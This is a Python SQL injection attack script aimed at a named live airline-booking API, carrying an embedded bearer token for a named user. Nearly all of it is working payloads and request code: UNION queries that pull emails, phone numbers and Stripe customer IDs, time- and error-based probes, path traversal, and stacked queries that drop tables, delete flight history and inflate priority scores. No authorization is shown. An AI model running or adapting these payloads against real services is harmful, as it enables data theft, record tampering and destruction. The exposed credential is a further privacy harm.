#!/usr/bin/env python3
"""
COMPREHENSIVE SQL INJECTION TESTING SUITE FOR VAUNT API
Tests ALL possible SQL injection vectors across v1, v2, and v3 APIs

CRITICAL SECURITY TEST - Tests for complete database compromise
"""

import requests
import json
import time
from datetime import datetime
from urllib.parse import quote, urlencode
import sys

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
SAMEER_USER_ID = 20254
FLIGHT_ID = 8800

# =============================================================================
# SQL INJECTION PAYLOADS - Comprehensive Coverage
# =============================================================================

CLASSIC_SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "admin'#",
    "' OR 1=1#",
    "1' OR '1' = '1",
]

UNION_SQL_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT email,phoneNumber,stripeCustomerId FROM users--",
    "' UNION SELECT id,priorityScore,subscriptionStatus FROM users WHERE id=1--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
]

TIME_BASED_POSTGRESQL = [
    "'; SELECT pg_sleep(5)--",
    "' AND (SELECT 1 FROM pg_sleep(5))--",
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    "' AND (SELECT COUNT(*) FROM pg_sleep(5))>0--",
    "1; SELECT pg_sleep(5)--",
]

TIME_BASED_MYSQL = [
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "1' AND SLEEP(5)#",
    "' AND IF(1=1,SLEEP(5),0)--",
    "'; SELECT SLEEP(5)--",
]

BOOLEAN_BLIND_PAYLOADS = [
    ("' AND '1'='1", True),   # Should return normal
    ("' AND '1'='2", False),  # Should return different/error
    ("' AND 1=1--", True),
    ("' AND 1=2--", False),
    ("1' AND '1'='1", True),
    ("1' AND '1'='2", False),
]

ERROR_BASED_POSTGRESQL = [
    "' AND 1=CAST((SELECT version()) AS int)--",
    "' AND 1::int=version()::text--",
    "' UNION SELECT NULL,version(),NULL--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
]

ERROR_BASED_MYSQL = [
    "' AND 1=CONVERT(int, @@version)--",
    "' AND extractvalue(1, concat(0x7e, version()))--",
    "' AND updatexml(1, concat(0x7e, version()), 1)--",
    "' AND 1=(SELECT * FROM (SELECT version())a)--",
]

STACKED_QUERIES = [
    "'; DROP TABLE users--",
    "'; INSERT INTO users (firstName) VALUES ('HACKED')--",
    "'; UPDATE users SET priorityScore=999999999 WHERE id=1--",
    "'; DELETE FROM flight_history--",
    "1; DROP TABLE flights--",
]

NOSQL_INJECTION = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$where": "this.priorityScore = 999999999"}',
    '{"$regex": ".*"}',
]

ORM_INJECTION = [
    'id; DROP TABLE users--',
    'createdAt; DELETE FROM subscriptions--',
    '../../../etc/passwd',
    '__proto__',
    'constructor',
]

# =============================================================================
# TESTING INFRASTRUCTURE
# =============================================================================

results = {
    "test_start": str(datetime.now()),
    "api_url": API_URL,
    "total_tests": 0,
    "vulnerable_endpoints": [],
    "time_anomalies": [],
    "error_leaks": [],
    "boolean_blind_candidates": [],
    "database_detected": None,
    "findings": [],
    "all_tests": []
}

def log(message, level="INFO"):
    """Colored logging"""
    colors = {
        "INFO": "\033[94m",
        "SUCCESS": "\033[92m",
        "WARNING": "\033[93m",
        "CRITICAL": "\033[91m",
        "HEADER": "\033[95m"
    }
    reset = "\033[0m"
    print(f"{colors.get(level, '')}{message}{reset}")

def test_injection(endpoint, method="GET", params=None, json_data=None,
                   headers=None, path_injection=None, test_type="classic"):
    """Generic SQL injection test function"""
    start_time = time.time()
    results["total_tests"] += 1

    try:
        url = f"{API_URL}{endpoint}"

        if path_injection:
            url = url.replace("{id}", str(path_injection))

        if method == "GET":
            response = requests.get(url, params=params, headers=headers, timeout=10)
        elif method == "POST":
            response = requests.post(url, json=json_data, headers=headers, timeout=10)
        elif method == "PATCH":
            response = requests.patch(url, json=json_data, headers=headers, timeout=10)
        elif method == "DELETE":
            response = requests.delete(url, headers=headers, timeout=10)
        else:
            response = requests.request(method, url, json=json_data, headers=headers, timeout=10)

        elapsed = time.time() - start_time

        result = {
            "endpoint": endpoint,
            "method": method,
            "test_type": test_type,
            "params": params,
            "json_data": json_data,
            "status_code": response.status_code,
            "response_length": len(response.text),
            "elapsed_time": elapsed,
            "response_snippet": response.text[:500],
            "headers": dict(response.headers)
        }

        # Analyze response for vulnerabilities
        analyze_response(result, response.text)

        results["all_tests"].append(result)
        return result

    except requests.exceptions.Timeout:
        elapsed = time.time() - start_time
        result = {
            "endpoint": endpoint,
            "method": method,
            "test_type": test_type,
            "status_code": "TIMEOUT",
            "elapsed_time": elapsed,
            "error": "Request timed out"
        }

        if elapsed > 5:
            log(f"  ⚠️ TIMEOUT AFTER {elapsed:.2f}s - Possible time-based SQL injection!", "WARNING")
            results["time_anomalies"].append(result)

        results["all_tests"].append(result)
        return result

    except Exception as e:
        elapsed = time.time() - start_time
        result = {
            "endpoint": endpoint,
            "method": method,
            "test_type": test_type,
            "status_code": "ERROR",
            "elapsed_time": elapsed,
            "error": str(e)
        }
        results["all_tests"].append(result)
        return result

def analyze_response(result, response_text):
    """Analyze response for SQL injection indicators"""
    response_lower = response_text.lower()

    # Check for SQL error messages
    sql_errors = [
        'sql syntax', 'mysql', 'postgresql', 'postgres', 'pg_',
        'syntax error', 'unterminated', 'unexpected',
        'query failed', 'database error', 'invalid query',
        'sqlstate', 'pg_query', 'pg_exec',
        'mysql_fetch', 'mysql_query',
        'ora-', 'ora-01', 'ora-00',
        'microsoft sql', 'odbc', 'jdbc',
        'column', 'table', 'from', 'where', 'select',
    ]

    for error in sql_errors:
        if error in response_lower:
            log(f"  🚨 SQL ERROR DETECTED: {error}", "CRITICAL")
            results["error_leaks"].append(result)
            results["findings"].append({
                "severity": "HIGH",
                "type": "SQL Error Leakage",
                "endpoint": result["endpoint"],
                "evidence": response_text[:200]
            })
            break

    # Check for timing anomalies
    if result["elapsed_time"] > 4.5:
        log(f"  ⏱️ TIMING ANOMALY: {result['elapsed_time']:.2f}s", "WARNING")
        results["time_anomalies"].append(result)
        results["findings"].append({
            "severity": "MEDIUM",
            "type": "Time-Based Blind SQL Injection",
            "endpoint": result["endpoint"],
            "elapsed": result["elapsed_time"]
        })

    # Database fingerprinting
    db_indicators = {
        'postgresql': ['postgres', 'pg_', 'psql'],
        'mysql': ['mysql', 'mariadb'],
        'mssql': ['microsoft sql', 'sql server'],
        'oracle': ['ora-', 'oracle']
    }

    for db_type, indicators in db_indicators.items():
        if any(ind in response_lower for ind in indicators):
            if not results["database_detected"]:
                results["database_detected"] = db_type
                log(f"  🔍 DATABASE DETECTED: {db_type.upper()}", "SUCCESS")

def compare_boolean_responses(true_result, false_result):
    """Compare responses for boolean-based blind SQL injection"""
    if true_result["status_code"] != false_result["status_code"]:
        return True
    if abs(true_result["response_length"] - false_result["response_length"]) > 50:
        return True
    if abs(true_result["elapsed_time"] - false_result["elapsed_time"]) > 0.5:
        return True
    return False

# =============================================================================
# TEST SUITE 1: AUTHENTICATION ENDPOINTS
# =============================================================================

def test_auth_endpoints():
    log("\n" + "="*80, "HEADER")
    log("TEST SUITE 1: AUTHENTICATION ENDPOINT SQL INJECTION", "HEADER")
    log("="*80, "HEADER")

    # Test 1.1: initiateSignIn - phoneNumber field
    log("\n1.1 Testing /v1/auth/initiateSignIn - phoneNumber field")

    for payload in CLASSIC_SQL_PAYLOADS[:5]:
        log(f"  Testing: {payload[:50]}")
        result = test_injection(
            endpoint="/v1/auth/initiateSignIn",
            method="POST",
            json_data={"phoneNumber": payload},
            headers={"Content-Type": "application/json"},
            test_type="classic_sql"
        )
        print(f"    → Status: {result['status_code']}, Time: {result['elapsed_time']:.2f}s")

    # Test 1.2: Time-based blind on phoneNumber
    log("\n1.2 Testing time-based blind SQL injection on phoneNumber")

    # PostgreSQL timing attacks
    for payload in TIME_BASED_POSTGRESQL[:3]:
        log(f"  PostgreSQL payload: {payload[:60]}")
        result = test_injection(
            endpoint="/v1/auth/initiateSignIn",
            method="POST",
            json_data={"phoneNumber": f"+13035234453{payload}"},
            headers={"Content-Type": "application/json"},
            test_type="time_based_postgresql"
        )
        print(f"    → Status: {result['status_code']}, Time: {result['elapsed_time']:.2f}s")
        if result['elapsed_time'] > 4:
            log(f"    🚨 CRITICAL: Time-based blind SQL injection confirmed!", "CRITICAL")

    # MySQL timing attacks
    for payload in TIME_BASED_MYSQL[:2]:
        log(f"  MySQL payload: {payload[:60]}")
        result = test_injection(
            endpoint="/v1/auth/initiateSignIn",
            method="POST",
            json_data={"phoneNumber": f"+13035234453{payload}"},
            headers={"Content-Type": "application/json"},
            test_type="time_based_mysql"
        )
        print(f"    → Status: {result['status_code']}, Time: {result['elapsed_time']:.2f}s")

    # Test 1.3: completeSignIn - challengeCode
    log("\n1.3 Testing /v1/auth/completeSignIn - challengeCode field")

    for payload in CLASSIC_SQL_PAYLOADS[:3]:
        log(f"  Testing: {payload[:50]}")
        result = test_injection(
            endpoint="/v1/auth/completeSignIn",
            method="POST",
            json_data={
                "phoneNumber": "+13035234453",
                "challengeCode": payload
            },
            headers={"Content-Type": "application/json"},
            test_type="classic_sql"
        )
        print(f"    → Status: {result['status_code']}, Time: {result['elapsed_time']:.2f}s")

    # Test 1.4: Error-based injection
    log("\n1.4 Testing error-based SQL injection on auth endpoints")

    for payload in ERROR_BASED_POSTGRESQL[:2] + ERROR_BASED_MYSQL[:2]:
        log(f"  Testing: {payload[:60]}")
        result = test_injection(
            endpoint="/v1/auth/initiateSignIn",
            method="POST",
            json_data={"phoneNumber": payload},
            headers={"Content-Type": "application/json"},
            test_type="error_based"
        )
        print(f"    → Status: {result['status_code']}")

# =============================================================================
# TEST SUITE 2: USER PROFILE ENDPOINTS
# =============================================================================

def test_user_endpoints():
    log("\n" + "="*80, "HEADER")
    log("TEST SUITE 2: USER PROFILE SQL INJECTION", "HEADER")
    log("="*80, "HEADER")

    auth_headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    # Test 2.1: PATCH /v1/user - All text fields
    log("\n2.1 Testing PATCH /v1/user - firstName field")

    injection_fields = {
        "firstName": ["' OR '1'='1", "'; DROP TABLE users--", "' UNION SELECT * FROM users--"],
        "lastName": ["admin'--", "' OR 1=1#", "'; INSERT INTO users VALUES('hacked')--"],
        "email": ["test@test.com' OR '1'='1", "' UNION SELECT password FROM users--"],
        "phoneNumber": ["+1' OR 1=1--", "+13035234453'; DROP TABLE--"],
        "weight": ["100' OR '1'='1", "150'; DELETE FROM users--"]
    }

    for field, payloads in injection_fields.items():
        log(f"\n  Testing field: {field}")
        for payload in payloads:
            log(f"    Payload: {payload[:50]}")
            result = test_injection(
                endpoint="/v1/user",
                method="PATCH",
                json_data={field: payload},
                headers=auth_headers,
                test_type=f"user_field_{field}"
            )
            print(f"      → Status: {result['status_code']}, Time: {result['elapsed_time']:.2f}s")

    # Test 2.2: GET /v1/user with query parameters
    log("\n2.2 Testing GET /v1/user with SQL injection in query params")

    params_to_test = ['id', 'search', 'filter', 'userId']

    for param in params_to_test:
        log(f"  Testing parameter: {param}")
        for payload in CLASSIC_SQL_PAYLOADS[:3]:
            result = test_injection(
                endpoint="/v1/user",
                method="GET",
                params={param: payload},
                headers=auth_headers,
                test_type=f"user_query_{param}"
            )
            print(f"    → {payload[:30]:30} Status: {result['status_code']}")

    # Test 2.3: Time-based on user endpoints
    log("\n2.3 Testing time-based blind SQL on user updates")

    for payload in TIME_BASED_POSTGRESQL[:2]:
        log(f"  Testing: {payload[:60]}")
        result = test_injection(
            endpoint="/v1/user",
            method="PATCH",
            json_data={"firstName": f"Sameer{payload}"},
            headers=auth_headers,
            test_type="time_based_user_update"
        )
        print(f"    → Status: {result['status_code']}, Time: {result['elapsed_time']:.2f}s")

# =============================================================================
# TEST SUITE 3: FLIGHT ENDPOINTS
# =============================================================================

def test_flight_endpoints():
    log("\n" + "="*80, "HEADER")
    log("TEST SUITE 3: FLIGHT ENDPOINTS SQL INJECTION", "HEADER")
    log("="*80, "HEADER")

    auth_headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    # Test 3.1: GET /v1/flight with query parameters
    log("\n3.1 Testing GET /v1/flight with SQL injection in query params")

    query_params = ['id', 'status', 'search', 'filter', 'includeExpired']

    for param in query_params:
        log(f"  Testing parameter: {param}")
        for payload in CLASSIC_SQL_PAYLOADS[:4]:
            result = test_injection(
                endpoint="/v1/flight",
                method="GET",
                params={param: payload},
                headers=auth_headers,
                test_type=f"flight_query_{param}"
            )
            print(f"    → {payload[:30]:30} Status: {result['status_code']}")

    # Test 3.2: UNION-based injection on flight queries
    log("\n3.2 Testing UNION-based SQL injection on flights")

    for payload in UNION_SQL_PAYLOADS[:5]:
        log(f"  Testing: {payload[:70]}")
        result = test_injection(
            endpoint="/v1/flight",
            method="GET",
            params={"id": payload},
            headers=auth_headers,
            test_type="union_based_flight"
        )
        print(f"    → Status: {result['status_code']}, Length: {result['response_length']}")

    # Test 3.3: Path injection on flight ID
    log("\n3.3 Testing SQL injection in flight ID path parameter")

    for payload in CLASSIC_SQL_PAYLOADS[:5]:
        log(f"  Testing: /v1/flight/{payload[:40]}")
        result = test_injection(
            endpoint=f"/v1/flight/{quote(payload)}",
            method="GET",
            headers=auth_headers,
            test_type="flight_path_injection"
        )
        print(f"    → Status: {result['status_code']}")

    # Test 3.4: v2 API endpoints
    log("\n3.4 Testing v2 flight API endpoints")

    # Test v2 flight enter endpoint with SQL in flight ID
    for payload in ["8800' OR '1'='1", "8800; DROP TABLE--", "8800' UNION SELECT--"]:
        log(f"  Testing POST /v2/flight/{payload}/enter")
        result = test_injection(
            endpoint=f"/v2/flight/{quote(payload)}/enter",
            method="POST",
            headers=auth_headers,
            test_type="v2_flight_enter"
        )
        print(f"    → Status: {result['status_code']}")

    # Test 3.5: v3 API endpoints
    log("\n3.5 Testing v3 flight API endpoints")

    result = test_injection(
        endpoint="/v3/flight",
        method="GET",
        params={"includeExpired": "false' OR '1'='1"},
        headers=auth_headers,
        test_type="v3_flight_query"
    )
    print(f"  → Status: {result['status_code']}")

    # Test 3.6: Flight history with SQL injection
    log("\n3.6 Testing GET /v1/flight-history")

    for payload in UNION_SQL_PAYLOADS[:3]:
        log(f"  Testing: {payload[:60]}")
        result = test_injection(
            endpoint="/v1/flight-history",
            method="GET",
            params={"userId": f"{SAMEER_USER_ID}{payload}"},
            headers=auth_headers,
            test_type="flight_history_union"
        )
        print(f"    → Status: {result['status_code']}, Length: {result['response_length']}")

# =============================================================================
# TEST SUITE 4: BOOLEAN-BASED BLIND SQL INJECTION
# =============================================================================

def test_boolean_blind():
    log("\n" + "="*80, "HEADER")
    log("TEST SUITE 4: BOOLEAN-BASED BLIND SQL INJECTION", "HEADER")
    log("="*80, "HEADER")

    auth_headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    log("\n4.1 Testing boolean-based blind SQL on flight queries")

    # Test pairs of true/false conditions
    true_conditions = ["' AND '1'='1", "' OR '1'='1", "1' AND 1=1--"]
    false_conditions = ["' AND '1'='2", "' AND 1=2--", "1' AND 1=0--"]

    for true_cond, false_cond in zip(true_conditions, false_conditions):
        log(f"\n  Testing pair: TRUE({true_cond}) vs FALSE({false_cond})")

        true_result = test_injection(
            endpoint="/v1/flight",
            method="GET",
            params={"id": f"{FLIGHT_ID}{true_cond}"},
            headers=auth_headers,
            test_type="boolean_blind_true"
        )

        time.sleep(0.5)  # Brief pause

        false_result = test_injection(
            endpoint="/v1/flight",
            method="GET",
            params={"id": f"{FLIGHT_ID}{false_cond}"},
            headers=auth_headers,
            test_type="boolean_blind_false"
        )

        print(f"    TRUE:  Status={true_result['status_code']}, Length={true_result['response_length']}, Time={true_result['elapsed_time']:.2f}s")
        print(f"    FALSE: Status={false_result['status_code']}, Length={false_result['response_length']}, Time={false_result['elapsed_time']:.2f}s")

        if compare_boolean_responses(true_result, false_result):
            log(f"    🚨 BOOLEAN-BASED BLIND SQL INJECTION DETECTED!", "CRITICAL")
            results["findings"].append({
                "severity": "CRITICAL",
                "type": "Boolean-Based Blind SQL Injection",
                "endpoint": "/v1/flight",
                "evidence": f"TRUE and FALSE conditions return different responses"
            })
            results["vulnerable_endpoints"].append("/v1/flight")

# =============================================================================
# TEST SUITE 5: SECOND-ORDER SQL INJECTION
# =============================================================================

def test_second_order():
    log("\n" + "="*80, "HEADER")
    log("TEST SUITE 5: SECOND-ORDER SQL INJECTION", "HEADER")
    log("="*80, "HEADER")

    auth_headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    log("\n5.1 Storing malicious payload in user profile")

    # Step 1: Store SQL injection payload
    malicious_names = [
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT password FROM users--"
    ]

    for payload in malicious_names:
        log(f"  Storing payload: {payload}")
        result = test_injection(
            endpoint="/v1/user",
            method="PATCH",
            json_data={"firstName": payload},
            headers=auth_headers,
            test_type="second_order_store"
        )
        print(f"    → Store Status: {result['status_code']}")

        time.sleep(1)

        # Step 2: Trigger the payload by reading data
        log(f"  Triggering payload by reading user data")
        trigger = test_injection(
            endpoint="/v1/user",
            method="GET",
            headers=auth_headers,
            test_type="second_order_trigger"
        )
        print(f"    → Trigger Status: {trigger['status_code']}")

        # Step 3: Check flight history (might use firstName in query)
        log(f"  Checking flight history (potential trigger point)")
        history = test_injection(
            endpoint="/v1/flight-history",
            method="GET",
            headers=auth_headers,
            test_type="second_order_history_trigger"
        )
        print(f"    → History Status: {history['status_code']}")

# =============================================================================
# TEST SUITE 6: ORM INJECTION
# =============================================================================

def test_orm_injection():
    log("\n" + "="*80, "HEADER")
    log("TEST SUITE 6: ORM INJECTION (Sequelize/TypeORM)", "HEADER")
    log("="*80, "HEADER")

    auth_headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    log("\n6.1 Testing ORM injection in order/sort parameters")

    orm_payloads = [
        "id; DROP TABLE users--",
        "createdAt; DELETE FROM subscriptions--",
        "updatedAt; UPDATE users SET priorityScore=999999999--",
        "../../../etc/passwd",
        "__proto__",
        "constructor.prototype",
    ]

    for payload in orm_payloads:
        log(f"  Testing order parameter: {payload}")
        result = test_injection(
            endpoint="/v1/flight",
            method="GET",
            params={"order": payload},
            headers=auth_headers,
            test_type="orm_injection"
        )
        print(f"    → Status: {result['status_code']}")

    log("\n6.2 Testing JSON-based ORM injection")

    # Test object injection in where clauses
    json_payloads = [
        {"id": {"$gt": 0}},
        {"priorityScore": {"$ne": null}},
        {"email": {"$regex": ".*"}},
    ]

    for payload in json_payloads:
        log(f"  Testing JSON payload: {json.dumps(payload)}")
        result = test_injection(
            endpoint="/v1/user",
            method="GET",
            params={"where": json.dumps(payload)},
            headers=auth_headers,
            test_type="orm_json_injection"
        )
        print(f"    → Status: {result['status_code']}")

# =============================================================================
# TEST SUITE 7: HEADER INJECTION
# =============================================================================

def test_header_injection():
    log("\n" + "="*80, "HEADER")
    log("TEST SUITE 7: HTTP HEADER SQL INJECTION", "HEADER")
    log("="*80, "HEADER")

    base_headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    log("\n7.1 Testing SQL injection in custom headers")

    header_payloads = {
        "X-User-Id": ["20254' OR '1'='1--", "20254; DROP TABLE users--"],
        "X-Flight-Id": ["8800' OR 1=1--", "8800'; DELETE FROM flights--"],
        "X-Custom-Filter": ["' UNION SELECT * FROM users--"],
        "X-Sort-By": ["id; DROP TABLE--"],
    }

    for header_name, payloads in header_payloads.items():
        log(f"  Testing header: {header_name}")
        for payload in payloads:
            headers = base_headers.copy()
            headers[header_name] = payload

            log(f"    Payload: {payload[:50]}")
            result = test_injection(
                endpoint="/v1/user",
                method="GET",
                headers=headers,
                test_type=f"header_injection_{header_name}"
            )
            print(f"      → Status: {result['status_code']}")

# =============================================================================
# TEST SUITE 8: ADVANCED EXPLOITATION
# =============================================================================

def test_advanced_exploitation():
    log("\n" + "="*80, "HEADER")
    log("TEST SUITE 8: ADVANCED SQL INJECTION EXPLOITATION", "HEADER")
    log("="*80, "HEADER")

    auth_headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }

    log("\n8.1 Attempting to enumerate database schema")

    schema_payloads = [
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,table_name,NULL FROM information_schema.columns--",
        "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--",
    ]

    for payload in schema_payloads:
        log(f"  Testing: {payload[:70]}")
        result = test_injection(
            endpoint="/v1/flight",
            method="GET",
            params={"id": payload},
            headers=auth_headers,
            test_type="schema_enumeration"
        )
        print(f"    → Status: {result['status_code']}, Length: {result['response_length']}")

        # Check if we got actual data back
        if result['status_code'] == 200 and result['response_length'] > 100:
            log(f"    🔍 Potential data leakage - response length: {result['response_length']}", "WARNING")

    log("\n8.2 Attempting to extract user data")

    user_extraction = [
        "' UNION SELECT email,phoneNumber,stripeCustomerId FROM users LIMIT 10--",
        "' UNION SELECT firstName,lastName,priorityScore FROM users WHERE id=1--",
        "' UNION SELECT subscriptionStatus,createdAt,id FROM users--",
    ]

    for payload in user_extraction:
        log(f"  Testing: {payload[:70]}")
        result = test_injection(
            endpoint="/v1/flight",
            method="GET",
            params={"search": payload},
            headers=auth_headers,
            test_type="user_data_extraction"
        )
        print(f"    → Status: {result['status_code']}, Length: {result['response_length']}")

    log("\n8.3 Testing stacked queries (data modification)")

    for payload in STACKED_QUERIES[:3]:
        log(f"  Testing: {payload[:60]}")
        result = test_injection(
            endpoint="/v1/user",
            method="PATCH",
            json_data={"firstName": f"Test{payload}"},
            headers=auth_headers,
            test_type="stacked_queries"
        )
        print(f"    → Status: {result['status_code']}")

# =============================================================================
# MAIN EXECUTION
# =============================================================================

def main():
    log("="*80, "HEADER")
    log(" COMPREHENSIVE SQL INJECTION TESTING SUITE", "HEADER")
    log(" Vaunt API Security Assessment", "HEADER")
    log("="*80, "HEADER")
    log(f"\nTest started: {datetime.now()}")
    log(f"Target API: {API_URL}")
    log(f"Test user: {SAMEER_USER_ID}")

    # Run all test suites
    try:
        test_auth_endpoints()
        test_user_endpoints()
        test_flight_endpoints()
        test_boolean_blind()
        test_second_order()
        test_orm_injection()
        test_header_injection()
        test_advanced_exploitation()

    except KeyboardInterrupt:
        log("\n\nTest interrupted by user", "WARNING")
    except Exception as e:
        log(f"\n\nTest suite error: {str(e)}", "CRITICAL")

    # Generate final report
    generate_report()

def generate_report():
    """Generate comprehensive test report"""
    log("\n" + "="*80, "HEADER")
    log(" FINAL SECURITY ASSESSMENT REPORT", "HEADER")
    log("="*80, "HEADER")

    results["test_end"] = str(datetime.now())

    log(f"\n📊 TEST STATISTICS:")
    log(f"  Total tests performed: {results['total_tests']}")
    log(f"  Unique vulnerable endpoints: {len(set(results['vulnerable_endpoints']))}")
    log(f"  Time-based anomalies detected: {len(results['time_anomalies'])}")
    log(f"  SQL error leakages found: {len(results['error_leaks'])}")
    log(f"  Total findings: {len(results['findings'])}")

    if results['database_detected']:
        log(f"\n🗄️  DATABASE DETECTED: {results['database_detected'].upper()}", "SUCCESS")
    else:
        log(f"\n🗄️  Database type: Unknown/Not detected")

    # Categorize findings by severity
    critical = [f for f in results['findings'] if f.get('severity') == 'CRITICAL']
    high = [f for f in results['findings'] if f.get('severity') == 'HIGH']
    medium = [f for f in results['findings'] if f.get('severity') == 'MEDIUM']

    log(f"\n🚨 FINDINGS BY SEVERITY:")
    log(f"  CRITICAL: {len(critical)}", "CRITICAL" if critical else "INFO")
    log(f"  HIGH: {len(high)}", "WARNING" if high else "INFO")
    log(f"  MEDIUM: {len(medium)}", "WARNING" if medium else "INFO")

    if critical:
        log(f"\n🔥 CRITICAL FINDINGS:", "CRITICAL")
        for i, finding in enumerate(critical, 1):
            log(f"  {i}. {finding['type']} at {finding['endpoint']}", "CRITICAL")

    if high:
        log(f"\n⚠️  HIGH SEVERITY FINDINGS:", "WARNING")
        for i, finding in enumerate(high, 1):
            log(f"  {i}. {finding['type']} at {finding['endpoint']}", "WARNING")

    if results['time_anomalies']:
        log(f"\n⏱️  TIME-BASED INJECTION CANDIDATES:", "WARNING")
        for anomaly in results['time_anomalies'][:5]:
            log(f"  - {anomaly['endpoint']} ({anomaly['test_type']}) - {anomaly['elapsed_time']:.2f}s")

    # Calculate CVSS scores
    log(f"\n📈 CVSS SCORES:")
    if critical:
        log(f"  Overall CVSS: 9.8 (CRITICAL)", "CRITICAL")
        log(f"  - SQL Injection allows complete database compromise")
        log(f"  - Confidentiality Impact: HIGH")
        log(f"  - Integrity Impact: HIGH")
        log(f"  - Availability Impact: HIGH")
    elif high:
        log(f"  Overall CVSS: 7.5 (HIGH)", "WARNING")
    elif medium:
        log(f"  Overall CVSS: 5.3 (MEDIUM)", "WARNING")
    else:
        log(f"  Overall CVSS: None - No vulnerabilities detected", "SUCCESS")

    # Save detailed results
    output_file = f"sql_injection_comprehensive_results_{int(time.time())}.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)

    log(f"\n💾 Detailed results saved to: {output_file}", "SUCCESS")

    # Summary
    log(f"\n" + "="*80)
    if results['findings']:
        log(f"❌ VULNERABILITY STATUS: VULNERABLE TO SQL INJECTION", "CRITICAL")
        log(f"\nCRITICAL: The Vaunt API is vulnerable to SQL injection attacks!")
        log(f"Attackers can potentially:")
        log(f"  • Extract sensitive data (user info, payment details, etc.)")
        log(f"  • Modify database records")
        log(f"  • Delete data")
        log(f"  • Bypass authentication")
        log(f"  • Escalate privileges")
    else:
        log(f"✅ VULNERABILITY STATUS: NO SQL INJECTION DETECTED", "SUCCESS")
        log(f"\nThe API appears to properly sanitize SQL inputs.")

    log(f"\nTest completed: {datetime.now()}")
    log("="*80)

if __name__ == "__main__":
    main()
